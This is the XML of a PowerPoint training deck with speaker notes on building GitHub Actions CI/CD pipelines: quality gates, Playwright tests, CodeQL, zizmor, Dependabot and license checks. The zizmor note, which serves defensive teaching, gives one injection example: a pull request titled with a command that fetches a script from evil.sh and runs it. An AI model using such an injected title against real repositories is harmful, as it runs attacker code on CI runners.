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handoutMasterIdLst>
    <p:handoutMasterId r:id="rId28"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="2147482476" r:id="rId5"/>
    <p:sldId id="2147482480" r:id="rId6"/>
    <p:sldId id="3001" r:id="rId7"/>
    <p:sldId id="3002" r:id="rId8"/>
    <p:sldId id="3003" r:id="rId9"/>
    <p:sldId id="3004" r:id="rId10"/>
    <p:sldId id="3005" r:id="rId11"/>
    <p:sldId id="3006" r:id="rId12"/>
    <p:sldId id="3007" r:id="rId13"/>
    <p:sldId id="2147482481" r:id="rId14"/>
    <p:sldId id="2147482482" r:id="rId15"/>
    <p:sldId id="3008" r:id="rId16"/>
    <p:sldId id="3009" r:id="rId17"/>
    <p:sldId id="3010" r:id="rId18"/>
    <p:sldId id="3011" r:id="rId19"/>
    <p:sldId id="3012" r:id="rId20"/>
    <p:sldId id="3013" r:id="rId21"/>
    <p:sldId id="3014" r:id="rId22"/>
    <p:sldId id="3015" r:id="rId23"/>
    <p:sldId id="3016" r:id="rId24"/>
    <p:sldId id="3017" r:id="rId25"/>
    <p:sldId id="714" r:id="rId26"/>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32" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" pos="7348" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="459" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" orient="horz" pos="3997" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="7"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519926-7414-C0ED-4314-9A45927821CE}" name="Oguri，Satoshi(小栗智)" initials="智小" userId="S::satoshi.oguri@dc.kyocera.com::989292a4-bab0-47ca-8783-2a8d4863b59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C9EF"/>
    <a:srgbClr val="FFFFFF"/>
    <a:srgbClr val="EAAD00"/>
    <a:srgbClr val="FFF5EF"/>
    <a:srgbClr val="FFFAF7"/>
    <a:srgbClr val="F0FBFE"/>
    <a:srgbClr val="FFF0E5"/>
    <a:srgbClr val="E8F9FE"/>
    <a:srgbClr val="E3F9EF"/>
    <a:srgbClr val="FFDE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94026" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="82" d="100"/>
          <a:sy n="82" d="100"/>
        </p:scale>
        <p:origin x="898" y="62"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide orient="horz" pos="2160"/>
        <p:guide pos="332"/>
        <p:guide pos="7348"/>
        <p:guide orient="horz" pos="459"/>
        <p:guide orient="horz" pos="3997"/>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30" tIns="45716" rIns="91430" bIns="45716"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49689" y="0"/>
            <a:ext cx="2946400" cy="496888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91430" tIns="45716" rIns="91430" bIns="45716" rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{D5CF7B6E-06F8-4EA4-9972-29E59E3DA8F7}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/10/23</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="フッター プレースホルダー 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="9429751"/>
            <a:ext cx="2946400" cy="496888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91430" tIns="45716" rIns="91430" bIns="45716"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49689" y="9429751"/>
            <a:ext cx="2946400" cy="496888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91430" tIns="45716" rIns="91430" bIns="45716" rtlCol="0" anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{CAB48240-D91F-4129-BF79-2A71E83D0D37}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2957974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30" tIns="45716" rIns="91430" bIns="45716"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9689" y="0"/>
            <a:ext cx="2946400" cy="496888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91430" tIns="45716" rIns="91430" bIns="45716" rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{FE9E4F50-57D5-4638-8961-5783F5566392}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/10/23</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1"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30" tIns="45716" rIns="91430" bIns="45716" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="ノート プレースホルダー 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="679451" y="4776788"/>
            <a:ext cx="5438775" cy="3908425"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91430" tIns="45716" rIns="91430" bIns="45716"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9751"/>
            <a:ext cx="2946400" cy="496888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91430" tIns="45716" rIns="91430" bIns="45716"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9689" y="9429751"/>
            <a:ext cx="2946400" cy="496888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91430" tIns="45716" rIns="91430" bIns="45716" rtlCol="0" anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="281029248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24D8C-3FB2-081B-6122-C2EAD9C7121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C8D60E1-855B-C434-0E61-3E7CB285B6C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldImg"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="ノート プレースホルダー 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E8DDF8E-56FF-5BCD-D72C-6F44B305B16B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Welcome. Today: how we build CI/CD with GitHub Actions, from the first workflow file to security scanning, OSS license compliance and deployment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Everything is demonstrated in a small repository with a TypeScript and a Java project.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="スライド番号プレースホルダー 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2EBD3D8D-48C5-98E3-6429-CE24399D2884}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2894725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for today. We go from the basics of GitHub Actions to a complete pipeline: CI checks, security, OSS license compliance and deployment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Everything shown is in the demo repository (github-actions-demo), with one TypeScript project and one Java project so we can compare both ecosystems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Plan about 35 minutes + Q&amp;A.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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building blocks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An EVENT (push, pull request, schedule, manual button, or another workflow) triggers a WORKFLOW, a YAML file in .github/workflows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A workflow has JOBS. Jobs run in parallel by default, each on a fresh virtual machine called a runner. Use "needs" to order them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A job is a list of STEPS. A step either runs a shell command (run:) or uses a reusable action (uses:), e.g. actions/checkout.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Everything is code in the repository, reviewed in pull requests like any other change.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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excerpt from ts-ci.yml. Five things to notice:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1. "on" lists the triggers. The same file runs on pull requests, on main, and when the deploy workflow calls it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. "permissions: {}" removes all token permissions; each job asks only for what it needs (contents: read).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3. "concurrency" cancels a superseded run when someone pushes again to the same PR.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>4. Third-party actions are pinned to a full commit SHA; the comment keeps the human-readable version. Dependabot updates both.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>5. "$/" is the new self-repository syntax for actions inside this repo (GitHub.com, July 2026).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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repository. Two projects with the same business logic so the pipelines are directly comparable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Six workflows: CI per project, one security workflow, the OSS compliance report, and a deploy workflow per project.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Composite actions remove duplication (setup-ts installs pnpm, Node and dependencies with caching). Dependabot is configuration only, no workflow needed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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the CI workflow is shaped. The quality gates are independent jobs, so they run in parallel: total time is roughly the slowest job, and the PR shows exactly which gate failed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Both projects have the same six gates, including a Playwright end-to-end test that drives the web page in a real Chromium.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>"build" declares needs on every gate, so it only runs when all of them pass. It proves the tarball or JAR can be built; the deploy workflow builds the released copy itself.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Reports (coverage, JUnit XML, the Playwright HTML report and traces) are uploaded with if: !cancelled(), so they are available even when tests fail, which is when you need them most.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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tools, what each check actually is. Read the last column out loud: it is the easiest way to explain each check.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Format = how the code looks. Lint = bad habits and likely bugs. Typecheck = right kind of data in the right place. Unit test = does it give the right answer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. Coverage = how much of the code the tests really touched. E2E = does the whole app work in a real browser, the way a user uses it.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>They are complementary: formatted code can still be wrong, tested code can still be ugly, and 100% coverage does not mean the asserts are good.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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comparison for security and compliance checks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Dependency audit looks at OTHER people's code we use (libraries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>). CodeQL looks at OUR code. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>zizmor looks at the pipeline itself</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>. Dependabot </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>is a doorman for pull requests. The license check is about legal permission, not bugs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Again, the last column is the one-sentence explanation for non-technical colleagues.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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colleagues who know one ecosystem but not the other, this is the translation table.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Java has an equivalent for every TypeScript check. Spotless is the Prettier of Java. Linting is split in two: Checkstyle for style rules, SpotBugs for bug patterns in the compiled bytecode.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Typecheck in Java is simply the compiler; we make it strict with -Xlint:all -Werror so warnings fail the build.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>There is no "mvn audit", so we generate a CycloneDX SBOM of the full dependency tree and scan it with Google's OSV-Scanner.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The Maven Wrapper (mvnw) pins the Maven version the same way the packageManager field pins </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>pnpm.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>End-to-end tests: Playwright in TypeScript, Playwright for Java with JUnit in Java. Both drive the same web page in Chromium; Java runs them through the e2e Maven profile.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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End-to-end tests check the whole app the way a user sees it: a real Chromium browser opens the page, fills in the invoice form, clicks Calculate and checks the totals. Unit tests prove one function; E2E proves the HTML, the HTTP API and the calculation work together.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Same tests, two ways to run them. pnpm e2e is non-interactive: headless, list output, HTML report never opens by itself, so it never blocks a terminal or a CI job. That is what the e2e job in ts-ci.yml runs. pnpm e2e:ui opens Playwright UI mode: pick a test, watch it run, step through every action and time-travel through the DOM snapshots. Use it while writing or debugging tests.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>playwright.config.ts has a webServer block, so Playwright builds the app and starts the server itself, then stops it at the end. With CI=true (set by GitHub) it retries flaky tests twice and fails on a forgotten test.only.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>The CI job installs Chromium with its Linux libraries (pnpm e2e:install) and uploads the HTML report, screenshots and traces even when tests fail. Download the ts-app-e2e-report artifact and run: pnpm exec playwright show-trace trace.zip.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Tests use getByLabel and getByRole, the same names a screen reader uses, so they survive layout changes.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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Java project gets the same end-to-end tests. It serves the exact same HTML page, from the JDK's built-in HTTP server, so no web framework is needed. Run it with ./mvnw compile exec:java and open http://localhost:8080.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>The tests use Playwright for Java with JUnit. The API is the same as in TypeScript: getByLabel, getByRole, getByTestId, and assertThat(...).hasText waits automatically, just like expect in TypeScript.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Non-interactive: ./mvnw -Pe2e test. The e2e profile adds the Playwright dependency and the src/e2e/java test folder, and runs only the E2E tests. It is opt-in because the Playwright driver is a 200 MB download the other Java jobs do not need.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Interactive: ./mvnw -Pe2e,e2e-ui test. Java has no UI mode, so this opens a visible browser in slow motion plus the Playwright Inspector: step through every action, see which element each locator picks, and resume when ready.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>In CI the e2e job installs Chromium and its Linux libraries through the Playwright CLI that ships inside the jar, runs the tests, and uploads the JUnit XML plus one trace per test. Open a trace with the same trace viewer as TypeScript.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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is layered; no single tool catches everything.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>CodeQL is GitHub's static analysis, the same tool our organization's repositories use. It understands data flow, so it finds injection paths through our own TypeScript and Java code, and with the actions language it also scans the workflow files. Results land in the Security tab.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>zizmor audits the workflows: template injection, excessive permissions, unpinned actions, persisted credentials and cache poisoning. Findings appear as annotations on the PR and fail the job.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>The dependency gate is the OSS Compliance workflow: it runs on every PR that changes package.json, pnpm-lock.yaml or pom.xml and fails on a high or critical CVE or a denied license. Dependabot opens update PRs and security fixes. The audit job covers known CVEs in the full tree.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cost: in a public repository all of this is free. In a private repository CodeQL needs GitHub Code Security (Advanced Security); the CodeQL license only allows open source code without it.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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zizmor teaches us. On the left, a workflow that works but is dangerous:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>write-all gives every step a token that can push code. Tags like @main or @v7 can be moved by whoever controls that repository, so the code you run can change silently.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The PR title is inserted directly into the shell script, so a PR titled $(curl evil.sh | sh) executes on our runner: that is template injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>On the right, the hardened version: no permissions by default, actions pinned to a commit SHA, checkout does not leave the token on disk, and untrusted input goes through an environment variable, so the shell treats it as data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Our demo repository passes zizmor with zero findings, even with the strictest "pedantic" persona.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{0E1B736C-7E22-4286-9492-6D135922483F}"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Dependabot is configured with a single YAML file, no workflow needed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Three ecosystems: npm (which also understands pnpm-lock.yaml), Maven, and GitHub Actions. That last one matters: it keeps our SHA-pinned actions up to date and rewrites the version comment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Groups bundle minor and patch updates into one PR instead of twenty.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
